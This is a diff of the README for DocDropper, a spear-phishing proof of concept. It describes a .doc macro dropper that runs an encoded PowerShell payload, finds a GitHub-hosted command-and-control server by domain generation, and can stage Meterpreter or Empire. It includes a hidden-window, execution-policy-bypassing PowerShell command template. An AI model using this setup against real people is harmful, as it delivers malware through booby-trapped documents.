@@ -1,19 +1,20 @@
 # DocDropper
+
 ## Reboot Spear Phishing
 
-DocDropper is a Proof Of Concept of a DOC file who run a payload like a meterpreter, empire, etc.
+#### Notice
 
-Indeed, DocDropper use a PowerShell Dynamic Generation Algorithm to find his C&C hosted on Github.com.
+DocDropper (POC+) is a .doc file dropper. You can start from it to setup Meterpreter, Empire, etc.
+
+Indeed, DocDropper use a PowerShell Dynamic Generation Algorithm (DGA) to find a C&C hosted on Github.com.
 
 Begin by `./dropper/vector.payload.ps1` : this is the encoded payload in the active Macro.
 
-## Miscellaneous
-
-#### Debug mode
-
 ```
-powershell.exe -ExecutionPolicy Bypass -encodedCommand ([Convert]::ToBase64String(([System.Text.Encoding]::Unicode.GetBytes((Get-Content ./vector.payload.ps1)))))
+powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -encodedCommand [code]
 ```
+
+## Reminder
 
 #### Cmd.exe to Meterpreter
 
